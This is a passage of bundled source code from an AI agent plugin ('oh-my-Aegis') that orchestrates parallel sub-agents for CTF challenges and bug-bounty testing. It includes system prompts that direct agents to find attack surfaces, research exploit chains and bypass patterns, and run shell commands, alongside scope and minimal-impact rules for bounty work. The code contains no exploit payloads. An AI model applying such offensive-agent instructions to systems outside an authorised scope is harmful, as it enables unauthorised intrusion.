      description: "Dispatch parallel child sessions for CTF scanning/hypothesis testing. " + "Creates N child sessions, each with a different agent/purpose, and sends prompts concurrently. " + "Use plan='scan' for initial parallel recon or plan='hypothesis' with hypotheses array.",
      args: {
        plan: schema3.enum(["scan", "hypothesis", "deep_worker"]),
        challenge_description: schema3.string().optional(),
        goal: schema3.string().optional(),
        hypotheses: schema3.string().optional(),
        max_tracks: schema3.number().int().min(1).max(5).optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const sessionClient = extractSessionClient(client);
        if (!sessionClient) {
          return JSON.stringify({
            ok: false,
            reason: "SDK session client not available (requires session.create + session.promptAsync)",
            sessionID
          }, null, 2);
        }
        parallelBackgroundManager.bindSessionClient(sessionClient);
        const activeGroup = getActiveGroup(sessionID);
        if (activeGroup) {
          return JSON.stringify({
            ok: false,
            reason: "Active parallel group already exists. Use ctf_parallel_collect or ctf_parallel_abort first.",
            sessionID,
            activeGroup: groupSummary(activeGroup)
          }, null, 2);
        }
        const state = store.get(sessionID);
        const bountyScanDefaultMaxTracks = config3.parallel.bounty_scan.max_tracks;
        const maxTracks = args.max_tracks ?? (args.plan === "scan" && state.mode === "BOUNTY" ? bountyScanDefaultMaxTracks : 3);
        let dispatchPlan;
        if (args.plan === "scan") {
          dispatchPlan = planScanDispatch(state, config3, args.challenge_description ?? "");
        } else if (args.plan === "deep_worker") {
          const goal = (args.goal ?? args.challenge_description ?? "").trim();
          dispatchPlan = planDeepWorkerDispatch(state, config3, goal);
        } else {
          let parsedHypotheses = [];
          if (args.hypotheses) {
            try {
              const raw = JSON.parse(args.hypotheses);
              if (Array.isArray(raw)) {
                parsedHypotheses = raw.filter((h) => h && typeof h === "object").map((h) => ({
                  hypothesis: String(h.hypothesis ?? h.h ?? ""),
                  disconfirmTest: String(h.disconfirmTest ?? h.disconfirm ?? h.test ?? "")
                })).filter((h) => h.hypothesis.length > 0);
              }
            } catch {
              return JSON.stringify({
                ok: false,
                reason: "Failed to parse hypotheses JSON. Expected: [{hypothesis, disconfirmTest}, ...]",
                sessionID
              }, null, 2);
            }
          }
          if (parsedHypotheses.length === 0) {
            return JSON.stringify({
              ok: false,
              reason: "hypothesis plan requires at least one hypothesis in JSON array format",
              sessionID
            }, null, 2);
          }
          dispatchPlan = planHypothesisDispatch(state, config3, parsedHypotheses);
        }
        try {
          const group = await dispatchParallel(sessionClient, sessionID, projectDir, dispatchPlan, maxTracks, { parallel: config3.parallel });
          parallelBackgroundManager.ensurePolling();
          parallelBackgroundManager.pollOnce();
          return JSON.stringify({
            ok: true,
            sessionID,
            dispatched: group.tracks.length,
            group: groupSummary(group)
          }, null, 2);
        } catch (error92) {
          return JSON.stringify({
            ok: false,
            reason: `Dispatch error: ${error92 instanceof Error ? error92.message : String(error92)}`,
            sessionID
          }, null, 2);
        }
      }
    }),
    ctf_parallel_status: tool({
      description: "Check the status of active parallel child sessions. " + "Shows each track's purpose, agent, and current status (running/completed/failed/aborted).",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const groups = getGroups(sessionID);
        if (groups.length === 0) {
          return JSON.stringify({
            ok: true,
            sessionID,
            hasActiveGroup: false,
            totalGroups: 0,
            message: "No parallel groups dispatched for this session."
          }, null, 2);
        }
        const activeGroup = getActiveGroup(sessionID);
        return JSON.stringify({
          ok: true,
          sessionID,
          hasActiveGroup: Boolean(activeGroup),
          totalGroups: groups.length,
          activeGroup: activeGroup ? groupSummary(activeGroup) : null,
          completedGroups: groups.filter((g) => g.completedAt > 0).map(groupSummary)
        }, null, 2);
      }
    }),
    ctf_parallel_collect: tool({
      description: "Collect results from parallel child sessions. " + "Reads messages from each track and returns their last assistant output. " + "Optionally declare a winner to abort the rest.",
      args: {
        winner_session_id: schema3.string().optional(),
        message_limit: schema3.number().int().min(1).max(20).optional(),
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const sessionClient = extractSessionClient(client);
        if (!sessionClient) {
          return JSON.stringify({
            ok: false,
            reason: "SDK session client not available",
            sessionID
          }, null, 2);
        }
        parallelBackgroundManager.bindSessionClient(sessionClient);
        await parallelBackgroundManager.pollOnce();
        const activeGroup = getActiveGroup(sessionID);
        if (!activeGroup) {
          const groups = getGroups(sessionID);
          if (groups.length === 0) {
            return JSON.stringify({
              ok: false,
              reason: "No parallel groups exist for this session.",
              sessionID
            }, null, 2);
          }
          const lastGroup = groups[groups.length - 1];
          return JSON.stringify({
            ok: true,
            sessionID,
            alreadyCompleted: true,
            group: groupSummary(lastGroup)
          }, null, 2);
        }
        const messageLimit = args.message_limit ?? 5;
        const results = await collectResults(sessionClient, activeGroup, projectDir, messageLimit);
        if (args.winner_session_id) {
          const abortedCount = await abortAllExcept(sessionClient, activeGroup, args.winner_session_id, projectDir);
          return JSON.stringify({
            ok: true,
            sessionID,
            winnerDeclared: args.winner_session_id,
            abortedTracks: abortedCount,
            group: groupSummary(activeGroup),
            results: results.map((r) => ({
              sessionID: r.sessionID,
              purpose: r.purpose,
              agent: r.agent,
              status: r.status,
              resultPreview: r.lastAssistantMessage.slice(0, 500)
            }))
          }, null, 2);
        }
        return JSON.stringify({
          ok: true,
          sessionID,
          group: groupSummary(activeGroup),
          results: results.map((r) => ({
            sessionID: r.sessionID,
            purpose: r.purpose,
            agent: r.agent,
            status: r.status,
            resultPreview: r.lastAssistantMessage.slice(0, 500)
          }))
        }, null, 2);
      }
    }),
    ctf_parallel_abort: tool({
      description: "Abort all running parallel child sessions. " + "Use when pivoting strategy or when a winner is found via ctf_parallel_collect.",
      args: {
        session_id: schema3.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const sessionClient = extractSessionClient(client);
        if (!sessionClient) {
          return JSON.stringify({
            ok: false,
            reason: "SDK session client not available",
            sessionID
          }, null, 2);
        }
        const activeGroup = getActiveGroup(sessionID);
        if (!activeGroup) {
          return JSON.stringify({
            ok: true,
            sessionID,
            message: "No active parallel group to abort."
          }, null, 2);
        }
        const abortedCount = await abortAll(sessionClient, activeGroup, projectDir);
        return JSON.stringify({
          ok: true,
          sessionID,
          abortedTracks: abortedCount,
          group: groupSummary(activeGroup)
        }, null, 2);
      }
    })
  };
}

// src/orchestration/parallel-background.ts
var DEFAULT_POLL_INTERVAL_MS = 2000;
var DEFAULT_TRACK_TTL_MS = 30 * 60 * 1000;
var DEFAULT_MESSAGE_LIMIT = 20;
function isRecord4(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function hasError3(result) {
  if (!isRecord4(result))
    return false;
  return Boolean(result.error);
}
function getGroupKey(group) {
  return `${group.parentSessionID}:${group.createdAt}:${group.label}`;
}
function extractStatusMap(statusResult) {
  if (!statusResult)
    return {};
  if (hasError3(statusResult))
    return {};
  if (isRecord4(statusResult) && isRecord4(statusResult.data)) {
    return statusResult.data;
  }
  if (isRecord4(statusResult)) {
    return statusResult;
  }
  return {};
}
async function callSessionStatusMap(sessionClient, directory) {
  try {
    const primary = await sessionClient.status({ query: { directory } });
    return extractStatusMap(primary);
  } catch (error92) {}
  try {
    const fallback = await sessionClient.status({ directory });
    return extractStatusMap(fallback);
  } catch (error92) {}
  try {
    const last = await sessionClient.status();
    return extractStatusMap(last);
  } catch (error92) {
    return {};
  }
}
async function callSessionMessagesData2(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (!hasError3(primary) && Array.isArray(primary?.data))
      return primary.data;
  } catch (error92) {}
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (!hasError3(fallback) && Array.isArray(fallback?.data))
      return fallback.data;
  } catch (error92) {}
  return null;
}
function extractLastAssistantText(messages) {
  let lastAssistant = "";
  for (const msg of messages) {
    if (!isRecord4(msg))
      continue;
    const role = typeof msg.role === "string" ? msg.role : isRecord4(msg.info) && typeof msg.info.role === "string" ? String(msg.info.role) : "";
    if (role !== "assistant")
      continue;
    const parts = Array.isArray(msg.parts) ? msg.parts : [];
    const text = parts.map((p) => isRecord4(p) && typeof p.text === "string" ? p.text : "").filter(Boolean).join(`
`);
    if (text)
      lastAssistant = text;
  }
  return lastAssistant;
}
function countGroupStatuses(group) {
  let completed = 0;
  let failed = 0;
  let aborted3 = 0;
  for (const t of group.tracks) {
    if (t.status === "completed")
      completed += 1;
    if (t.status === "failed")
      failed += 1;
    if (t.status === "aborted")
      aborted3 += 1;
  }
  return { completed, failed, aborted: aborted3, total: group.tracks.length + group.queue.length };
}
function hasRunningTracks(group) {
  if (group.queue.length > 0)
    return true;
  return group.tracks.some((t) => t.status === "running" || t.status === "pending");
}
function isGroupDone(group) {
  if (group.queue.length > 0)
    return false;
  return group.tracks.every((t) => t.status === "completed" || t.status === "failed" || t.status === "aborted");
}

class ParallelBackgroundManager {
  params;
  sessionClient = null;
  pollingInterval;
  pollInFlight = false;
  notifiedGroupKeys = new Set;
  constructor(params) {
    this.params = params;
  }
  bindSessionClient(sessionClient) {
    this.sessionClient = sessionClient;
  }
  ensurePolling() {
    if (!this.sessionClient)
      return;
    if (this.pollingInterval)
      return;
    if (!this.hasAnyRunningTracks())
      return;
    const intervalMs = this.params.pollIntervalMs ?? DEFAULT_POLL_INTERVAL_MS;
    this.pollingInterval = setInterval(() => {
      this.pollOnce();
    }, intervalMs);
    this.pollingInterval?.unref?.();
  }
  stopPolling() {
    if (!this.pollingInterval)
      return;
    clearInterval(this.pollingInterval);
    this.pollingInterval = undefined;
  }
  handleEvent(type, props) {
    if (!type)
      return;
    if (!this.sessionClient)
      return;
    if (type === "session.idle") {
      const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
      if (sessionID) {
        this.pollOnce();
      }
    }
    if (type === "session.status") {
      const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
      const status = props.status;
      if (sessionID && status?.type === "idle") {
        this.pollOnce();
      }
    }
    if (type === "session.deleted") {
      const info = props.info;
      const deletedID = isRecord4(info) && typeof info.id === "string" ? info.id : "";
      if (!deletedID)
        return;
      this.markSessionDeleted(deletedID);
      this.pollOnce();
    }
  }
  markSessionDeleted(sessionID) {
    const now = Date.now();
    let changed = false;
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        for (const track of group.tracks) {
          if (track.sessionID !== sessionID)
            continue;
          if (track.status === "completed" || track.status === "failed" || track.status === "aborted") {
            continue;
          }
          track.status = "aborted";
          track.result = track.result || "Session deleted";
          track.completedAt = now;
          changed = true;
        }
        if (group.completedAt === 0 && isGroupDone(group)) {
          group.completedAt = now;
          changed = true;
        }
      }
    }
    if (changed) {
      persistParallelGroups();
    }
  }
  async pollOnce() {
    if (!this.sessionClient)
      return;
    if (this.pollInFlight)
      return;
    this.pollInFlight = true;
    try {
      await this.pollOnceInner(this.sessionClient);
    } finally {
      this.pollInFlight = false;
    }
  }
  hasAnyRunningTracks() {
    for (const groups of getAllGroups().values()) {
      for (const g of groups) {
        if (g.completedAt > 0)
          continue;
        if (hasRunningTracks(g))
          return true;
      }
    }
    return false;
  }
  pruneStaleTracks(now) {
    const ttlMs = this.params.trackTtlMs ?? DEFAULT_TRACK_TTL_MS;
    let changed = false;
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        for (const track of group.tracks) {
          if (track.status !== "running" && track.status !== "pending")
            continue;
          const age = now - track.createdAt;
          if (age <= ttlMs)
            continue;
          track.status = "failed";
          track.result = track.result || "Timed out while running parallel track";
          track.completedAt = now;
          changed = true;
        }
        if (group.completedAt === 0 && isGroupDone(group)) {
          group.completedAt = now;
          changed = true;
        }
      }
    }
    if (changed) {
      persistParallelGroups();
    }
  }
  async pollOnceInner(sessionClient) {
    const now = Date.now();
    this.pruneStaleTracks(now);
    if (!this.hasAnyRunningTracks()) {
      this.stopPolling();
      return;
    }
    const directory = this.params.directory;
    const statusMap = await callSessionStatusMap(sessionClient, directory);
    const idleSessionIDs = new Set;
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        if (group.completedAt > 0)
          continue;
        for (const track of group.tracks) {
          if (!track.sessionID)
            continue;
          if (track.status !== "running" && track.status !== "pending")
            continue;
          const status = statusMap[track.sessionID];
          if (status?.type === "idle") {
            idleSessionIDs.add(track.sessionID);
          }
        }
      }
    }
    for (const groups of getAllGroups().values()) {
      for (const group of groups) {
        if (group.completedAt > 0)
          continue;
        await this.updateGroupFromIdle(sessionClient, group, idleSessionIDs);
        await dispatchQueuedTracks(sessionClient, group, directory);
        if (group.completedAt === 0 && isGroupDone(group)) {
          group.completedAt = Date.now();
        }
        if (group.completedAt > 0) {
          await this.notifyGroupCompleted(group);
        }
      }
    }
    persistParallelGroups();
    if (!this.hasAnyRunningTracks()) {
      this.stopPolling();
    }
  }
  async updateGroupFromIdle(sessionClient, group, idleSessionIDs) {
    const directory = this.params.directory;
    for (const track of group.tracks) {
      if (!track.sessionID)
        continue;
      if (track.status !== "running" && track.status !== "pending")
        continue;
      if (!idleSessionIDs.has(track.sessionID))
        continue;
      try {
        const data = await callSessionMessagesData2(sessionClient, track.sessionID, directory, DEFAULT_MESSAGE_LIMIT);
        const lastAssistant = Array.isArray(data) ? extractLastAssistantText(data) : "";
        if (lastAssistant) {
          track.result = lastAssistant.slice(0, 2000);
          track.status = "completed";
          track.completedAt = Date.now();
        } else {
          track.result = track.result || "(idle; no assistant text message found)";
          track.status = "completed";
          track.completedAt = Date.now();
        }
      } catch (error92) {
        track.status = "failed";
        track.result = `Collection error: ${error92 instanceof Error ? error92.message : String(error92)}`;
        track.completedAt = Date.now();
      }
    }
  }
  async notifyGroupCompleted(group) {
    const key = getGroupKey(group);
    if (this.notifiedGroupKeys.has(key))
      return;
    this.notifiedGroupKeys.add(key);
    const counts = countGroupStatuses(group);
    const title = "oh-my-Aegis: parallel complete";
    const message = `${group.label} (${counts.completed} ok, ${counts.failed} fail, ${counts.aborted} aborted). Use ctf_parallel_collect.`;
    const text = [
      "[oh-my-Aegis parallel]",
      `group=${group.label}`,
      `tracks=${counts.total} completed=${counts.completed} failed=${counts.failed} aborted=${counts.aborted}`,
      "Next:",
      "- ctf_parallel_collect message_limit=5"
    ].join(`
`);
    await this.maybeShowToast(title, message, "success");
    await this.maybePromptParent(group.parentSessionID, text);
  }
  async maybeShowToast(title, message, variant) {
    if (!this.params.config.tui_notifications.enabled)
      return;
    const toastFn = this.params.client?.tui?.showToast;
    if (typeof toastFn !== "function")
      return;
    const duration5 = 5000;
    try {
      await toastFn({
        directory: this.params.directory,
        title,
        message,
        variant,
        duration: duration5
      });
      return;
    } catch (error92) {}
    try {
      await toastFn({
        query: { directory: this.params.directory },
        body: {
          title,
          message,
          variant,
          duration: duration5
        }
      });
    } catch (error92) {}
  }
  async maybePromptParent(sessionID, text) {
    const session = this.params.client?.session;
    const promptAsync = session?.promptAsync;
    if (typeof promptAsync !== "function")
      return;
    const parts = [
      {
        type: "text",
        text,
        synthetic: true,
        metadata: {
          source: "oh-my-Aegis.parallel"
        }
      }
    ];
    try {
      await promptAsync({
        path: { id: sessionID },
        query: { directory: this.params.directory },
        body: { parts }
      });
      return;
    } catch (error92) {}
    try {
      await promptAsync({
        sessionID,
        directory: this.params.directory,
        parts
      });
    } catch (error92) {}
  }
}

// src/agents/aegis-orchestrator.ts
var DEFAULT_MODEL = "openai/gpt-5.3-codex";
var AEGIS_ORCHESTRATOR_PROMPT = `You are "Aegis" \u2014 a CTF/BOUNTY orchestrator.

You optimize for:
- CTF: speed + verified end-to-end correctness (decoy-resistant)
- BOUNTY: scope-first + minimal-impact validation (safety-first)

Communication:
- Reply in Korean by default (unless user asks otherwise).
- Be concise and evidence-driven.

Operating loop (always):
1) Read current orchestrator state via ctf_orch_status.
2) Decide next action. Prefer the recommended route from ctf_orch_next unless you have a better reason.
3) Delegate the work:
   - PLAN => aegis-plan (planning only)
   - EXECUTE => aegis-exec (execute from a short plan-backed TODO list)
   - Hard REV/PWN pivots => aegis-deep (deep worker)
4) Record state via ctf_orch_event when you discover new evidence/candidate/verification outcome.

CTF policy:
- Follow SCAN -> PLAN -> EXECUTE.
- If SCAN phase and no active parallel group exists: dispatch parallel scans.
  - Use ctf_parallel_dispatch plan=scan with the challenge description.
  - While tracks run, do not block; collect results later with ctf_parallel_collect.
- When planning is ready: call ctf_orch_event event=plan_completed (aegis-plan should do this).
- If verification fails (Wrong!/Fail): treat prior output as DECOY candidate and pivot. Do NOT spend time debugging mismatch.
- If stuck triggers: pivot to the stuck route (ctf-research / target-specific stuck agent), and run ONE cheapest disconfirm test.

BOUNTY policy:
- Never do active testing until scope is confirmed.
- Default to read-only / minimal impact checks.
- Avoid broad scanning, fuzzing, brute forcing.
- If 2 read-only attempts are inconclusive: escalate to bounty-research and propose ONE scope-safe validation.

Parallel orchestration:
- Use ctf_parallel_dispatch for SCAN (and hypothesis testing when you have 2-3 hypotheses).
- Use ctf_parallel_status to see running tracks.
- Use ctf_parallel_collect to merge results.
- If a clear winner exists: declare it and abort the rest (winner_session_id).

Delegation-first contract (critical):
- You are an orchestrator, not an executor. Delegate domain work to subagents.
- Do NOT do substantive domain analysis with direct grep/read/bash when a subagent can do it.
- Use orchestration tools first: ctf_orch_status/next/event + ctf_parallel_dispatch/status/collect.
- If needed, pin subagent execution profile via ctf_orch_set_subagent_profile (model + variant).
- Keep long outputs out of chat: redirect to files when possible.
- Do not use direct execution tools yourself. Keep manager role strict and delegate.
`;
function createAegisOrchestratorAgent(model = DEFAULT_MODEL) {
  return {
    description: "Aegis - CTF/BOUNTY orchestrator. Runs SCAN/PLAN/EXECUTE, dispatches parallel child sessions, enforces bounty safety, and pivots fast on verification mismatch.",
    mode: "primary",
    model,
    prompt: AEGIS_ORCHESTRATOR_PROMPT,
    color: "#1F6FEB",
    maxSteps: 24,
    permission: {
      edit: "deny",
      bash: "deny",
      webfetch: "deny",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisOrchestratorAgent = createAegisOrchestratorAgent();

// src/agents/aegis-plan.ts
var DEFAULT_MODEL2 = "openai/gpt-5.3-codex";
var AEGIS_PLAN_PROMPT = `You are "Aegis Plan" \u2014 a planning subagent for CTF/BOUNTY.

Core job:
- Do interview-driven planning, then hand off execution to aegis-exec.
- You produce a concrete plan + cheapest disconfirm tests.

Rules:
- Planning-only: do NOT run bash, do NOT edit/write files.
- Always start by calling ctf_orch_status to read MODE/PHASE/TARGET and current counters.
- If context is missing (no challenge description, no artifacts, no scan notes): ask up to 3 targeted questions.
- Output must be structured and ready for execution.
- Reply in Korean by default.

Output format (Markdown):
1) 3-6 Observations (facts only)
2) Leading Hypothesis (LH) + why
3) Alternatives (2-4)
4) Cheapest disconfirm tests (1 per hypothesis)
5) Execution plan (2-6 steps)
6) TODO plan (2-8 items recommended, multiple pending allowed, one in_progress)
7) Verification plan (how to confirm Correct/Fail)

State updates:
- When you choose LH/alternatives, call ctf_orch_event to set hypothesis/alternatives.
- When your plan is ready, call ctf_orch_event event=plan_completed.

CTF specifics:
- Prefer disconfirm-first; stop-loss: if verifier says Wrong/Fail, pivot immediately.

BOUNTY specifics:
- If scope is not confirmed, do not propose active testing; route to bounty-scope discipline.
- Your plan must be minimal-impact and explicitly list what is safe to do in-scope.
`;
function createAegisPlanAgent(model = DEFAULT_MODEL2) {
  return {
    description: "Aegis Plan - planner. Produces interview-driven plans + cheapest disconfirm tests, then hands off to aegis-exec.",
    mode: "subagent",
    hidden: true,
    model,
    prompt: AEGIS_PLAN_PROMPT,
    color: "#EAB308",
    maxSteps: 16,
    permission: {
      edit: "deny",
      bash: "deny",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisPlanAgent = createAegisPlanAgent();

// src/agents/aegis-exec.ts
var DEFAULT_MODEL3 = "openai/gpt-5.3-codex";
var AEGIS_EXEC_PROMPT = `You are "Aegis Exec" \u2014 an execution subagent for CTF/BOUNTY.

Core job:
- Execute ONE focused TODO loop from the current plan.
- Delegate domain work explicitly via task(subagent_type=...).
  - CTF: ctf-web/ctf-web3/ctf-pwn/ctf-rev/ctf-crypto/ctf-explore/ctf-solve
  - BOUNTY: bounty-triage/bounty-research (scope gating is handled by bounty-scope)

Rules:
- Always start by calling ctf_orch_status.
- If available, read the durable plan in .Aegis/PLAN.md.
- Execute exactly ONE TODO and stop.
- Do NOT call task() without an explicit subagent_type; otherwise you may route back to aegis-exec.
- Record state via ctf_orch_event when you discover new evidence / candidate / verification outcome.
- Reply in Korean by default.

CTF specifics:
- If you produce a candidate, call ctf_orch_event event=candidate_found candidate="...".
- Verification mismatch (Wrong/Fail) => treat as decoy candidate and pivot; do NOT debug mismatch.

BOUNTY specifics:
- Never do active testing before scope is confirmed.
- Prefer minimal-impact validation; if unsure, delegate to bounty-triage.
`;
function createAegisExecAgent(model = DEFAULT_MODEL3) {
  return {
    description: "Aegis Exec - executor. Executes from a short plan-backed TODO list, delegates domain work, records evidence, and stops.",
    mode: "subagent",
    hidden: true,
    model,
    prompt: AEGIS_EXEC_PROMPT,
    color: "#22C55E",
    maxSteps: 24,
    permission: {
      edit: "ask",
      bash: "allow",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisExecAgent = createAegisExecAgent();

// src/agents/aegis-deep.ts
var DEFAULT_MODEL4 = "openai/gpt-5.3-codex";
var AEGIS_DEEP_PROMPT = `You are "Aegis Deep" \u2014 an autonomous deep worker for hard CTF/BOUNTY targets (especially REV/PWN).

Core job:
- Given a goal, dispatch 2-5 parallel exploration tracks.
- Merge results, pick the best next move, and propose a flexible TODO set.

Rules:
- Always start by calling ctf_orch_status.
- Use ctf_parallel_dispatch plan=deep_worker with a clear goal (or challenge description) and max_tracks.
- While tracks run: do not block; use ctf_parallel_status then ctf_parallel_collect.
- If a clear winner exists: abort others via winner_session_id.
- After synthesis: either (a) dispatch aegis-exec with a concrete next TODO, or (b) return the next TODO + evidence needs.
- After synthesis: either (a) dispatch aegis-exec with a concrete TODO set, or (b) return the next TODO set + evidence needs.
- Reply in Korean by default.

Safety:
- BOUNTY: do not do active testing before scope is confirmed.
- In BOUNTY mode, deep_worker plan will use bounty-triage/bounty-research tracks.
`;
function createAegisDeepAgent(model = DEFAULT_MODEL4) {
  return {
    description: "Aegis Deep - deep worker. Dispatches parallel tracks, merges results, and outputs the next TODO set.",
    mode: "subagent",
    hidden: true,
    model,
    prompt: AEGIS_DEEP_PROMPT,
    color: "#F97316",
    maxSteps: 28,
    permission: {
      edit: "ask",
      bash: "allow",
      webfetch: "allow",
      external_directory: "deny",
      doom_loop: "deny"
    }
  };
}
var aegisDeepAgent = createAegisDeepAgent();

// src/agents/aegis-explore.ts
var AEGIS_EXPLORE_SYSTEM_PROMPT = `You are "Aegis-Explore" \u2014 a lightweight contextual grep subagent for CTF/BOUNTY analysis.

Mission:
- Perform fast, targeted search and pattern discovery on challenge files, binaries, and codebases.
- Focus on attack surface identification and vulnerability pattern discovery.
- Support both CTF (challenge artifact analysis) and BOUNTY (codebase security review) modes.

Allowed workflow:
- Use grep, glob, read, and ast_grep_search for deterministic discovery.
- Prioritize high-signal locations first: entry points, handlers/controllers, auth/session logic, parsers, deserialization, command execution, file access, crypto usage, and unsafe sinks.
- Trace suspicious patterns to concrete file and line references.

Hard constraints:
- Never attempt to solve, exploit, or patch. Observe and report only.
- Keep output to at most 20 lines.
- Use bullet points only.
- Every bullet must include file:line references when available.

Output format:
- "- <file>:<line> - <observation>"
- Include concrete findings only: discovered surface, risky patterns, weak validation points, suspicious constants/flows, and likely vulnerability classes.`;
function createAegisExploreAgent() {
  return {
    mode: "subagent",
    hidden: true,
    systemPrompt: AEGIS_EXPLORE_SYSTEM_PROMPT
  };
}

// src/agents/aegis-librarian.ts
var AEGIS_LIBRARIAN_SYSTEM_PROMPT = `You are "Aegis-Librarian" \u2014 an external reference research subagent for CTF/BOUNTY.

Mission:
- Search external security references: official docs, CVE databases, GitHub repositories, and writeups.
- Focus on exploitation techniques, known vulnerabilities, and similar challenge or real-world patterns.
- Support security-focused research for CVEs, exploit chains, framework/library weaknesses, and defensive bypass patterns.

Tooling:
- Use websearch_web_search_exa for broad discovery.
- Use context7 for official framework/library documentation.
- Use grep_app_searchGitHub for real OSS implementation patterns and exploit-adjacent code examples.

Output contract:
- Return 3-5 highly relevant references only.
- Always cite sources with URLs.
- For each reference, include title, URL, and a 1-2 line applicability summary tied to the current query.
- Prioritize source quality and recency.

Format:
1. <Title>
   - URL: <https://...>
   - Relevance: <1-2 lines>

If evidence quality is weak, explicitly say what is missing and which source type to search next.`;
function createAegisLibrarianAgent() {
  return {
    mode: "subagent",
    hidden: true,
    systemPrompt: AEGIS_LIBRARIAN_SYSTEM_PROMPT
  };
}

// src/recovery/error-utils.ts
function isRecord5(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function extractErrorMessage(error92) {
  if (!error92)
    return "";
  if (typeof error92 === "string")
    return error92;
  if (error92 instanceof Error) {
    return error92.message || String(error92);
  }
  if (isRecord5(error92)) {
    const candidates2 = [
      error92,
      error92.error,
      error92.data,
      isRecord5(error92.data) ? error92.data.error : null
    ];
    for (const item of candidates2) {
      if (!item)
        continue;
      if (typeof item === "string" && item.trim().length > 0) {
        return item;
      }
      if (item instanceof Error) {
        return item.message || String(item);
      }
      if (isRecord5(item)) {
        const msg = item.message;
        if (typeof msg === "string" && msg.trim().length > 0) {
          return msg;
        }
        const text = item.text;
        if (typeof text === "string" && text.trim().length > 0) {
          return text;
        }
      }
    }
  }
  try {
    return JSON.stringify(error92);
  } catch {
    return String(error92);
  }
}

// src/recovery/session-recovery.ts
function isRecord6(value) {
  return Boolean(value) && typeof value === "object" && !Array.isArray(value);
}
function hasError4(result) {
  if (!isRecord6(result))
    return false;
  return Boolean(result.error);
}
function detectSessionRecoveryErrorType(error92) {
  const message = extractErrorMessage(error92).toLowerCase();
  if (!message)
    return null;
  if (message.includes("assistant message prefill") || message.includes("conversation must end with a user message")) {
    return "assistant_prefill_unsupported";
  }
  if (message.includes("thinking is disabled") && message.includes("cannot contain")) {
    return "thinking_disabled_violation";
  }
  if (message.includes("thinking") && (message.includes("first block") || message.includes("must start with") || message.includes("preced") || message.includes("final block") || message.includes("cannot be thinking") || message.includes("expected") && message.includes("found"))) {
    return "thinking_block_order";
  }
  if (message.includes("tool_use") && message.includes("tool_result")) {
    return "tool_result_missing";
  }
  return null;
}
async function showToast(params) {
  const tui = isRecord6(params.client) ? params.client.tui : null;
  const toastFn = isRecord6(tui) ? tui.showToast : null;
  if (typeof toastFn !== "function")
    return;
  const title = params.title.slice(0, 80);
  const message = params.message.slice(0, 240);
  const duration5 = 3000;
  try {
    await toastFn({
      directory: params.directory,
      title,
      message,
      variant: params.variant,
      duration: duration5
    });
    return;
  } catch {}
  try {
    await toastFn({
      query: { directory: params.directory },
      body: { title, message, variant: params.variant, duration: duration5 }
    });
  } catch {}
}
async function callSessionAbort2(sessionClient, sessionID, directory) {
  try {
    const primary = await sessionClient.abort({ path: { id: sessionID }, query: { directory } });
    if (!hasError4(primary))
      return;
  } catch {}
  try {
    await sessionClient.abort({ sessionID, directory });
  } catch {}
}
async function callSessionMessages(sessionClient, sessionID, directory, limit) {
  try {
    const primary = await sessionClient.messages({
      path: { id: sessionID },
      query: { directory, limit }
    });
    if (!hasError4(primary) && Array.isArray(primary.data)) {
      return primary.data;
    }
  } catch {}
  try {
    const fallback = await sessionClient.messages({ sessionID, directory, limit });
    if (!hasError4(fallback) && Array.isArray(fallback.data)) {
      return fallback.data;
    }
  } catch {}
  return null;
}
async function callSessionPromptParts(sessionClient, sessionID, directory, parts) {
  try {
    const primary = await sessionClient.promptAsync({
      path: { id: sessionID },
      query: { directory },
      body: { parts }
    });
    if (!hasError4(primary))
      return true;
  } catch {}
  try {
    const fallback = await sessionClient.promptAsync({ sessionID, directory, parts });
    return !hasError4(fallback);
  } catch {
    return false;
  }
}
function findMessageById(messages, messageID) {
  for (const msg of messages) {
    if (!isRecord6(msg))
      continue;
    const info = isRecord6(msg.info) ? msg.info : null;
    const topId = typeof msg.id === "string" ? msg.id : "";
    const infoId = info && typeof info.id === "string" ? String(info.id) : "";
    const id = infoId || topId;
    if (!id || id !== messageID)
      continue;
    const parts = Array.isArray(msg.parts) ? msg.parts : [];
    return { info: info ?? {}, parts };
  }
  return null;
}
function extractToolUses(parts) {
  const uses = [];
  for (const part of parts) {
    if (!isRecord6(part))
      continue;
    const type = typeof part.type === "string" ? part.type : "";
    if (type !== "tool_use" && type !== "tool")
      continue;
    const id = typeof part.id === "string" ? part.id : typeof part.callID === "string" ? part.callID : "";
    if (!id)
      continue;
    const name = typeof part.name === "string" ? part.name : "";
    uses.push({ id, name });
  }
  const seen = new Set;
  const deduped = [];
  for (const u of uses) {
    if (seen.has(u.id))
      continue;
    seen.add(u.id);
    deduped.push(u);
  }
  return deduped;
}
function extractMessageInfoFromUpdatedEvent(props) {
  const info = isRecord6(props.info) ? props.info : null;
  if (!info)
    return null;
  const role = typeof info.role === "string" ? info.role : "";
  const sessionID = typeof info.sessionID === "string" ? info.sessionID : "";
  const messageID = typeof info.id === "string" ? info.id : "";
  const error92 = info.error;
  if (!sessionID || !messageID || !role || !error92)
    return null;
  return { sessionID, messageID, role, error: error92 };
}
function createSessionRecoveryManager(params) {
  const sessionClient = extractSessionClient(params.client);
  const processingByMessageID = new Set;
  const isRecoverableError = (error92) => {
    return detectSessionRecoveryErrorType(error92) !== null;
  };
  const handleEvent = async (type, props) => {
    if (!params.config.recovery.enabled || !params.config.recovery.session_recovery) {
      return;
    }
